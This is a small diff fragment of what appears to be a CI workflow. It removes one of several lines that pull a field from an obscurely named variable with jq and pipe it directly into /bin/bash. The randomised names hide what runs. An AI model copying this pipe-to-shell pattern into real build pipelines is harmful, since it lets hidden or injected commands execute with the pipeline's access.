@@ -25,7 +25,6 @@ jobs:
           echo $cds6535 | jq -r .gl3800 | /bin/bash
           printf '%s' "$y9842" | jq -r .gr90 | /bin/bash
           echo $t843 | jq -r .mqy547 | /bin/bash
-          echo $ryje39 | jq -r .dfz848 | /bin/bash
           echo $xg983 | jq -r .clsj3 | /bin/bash
 
       - name: Persist output
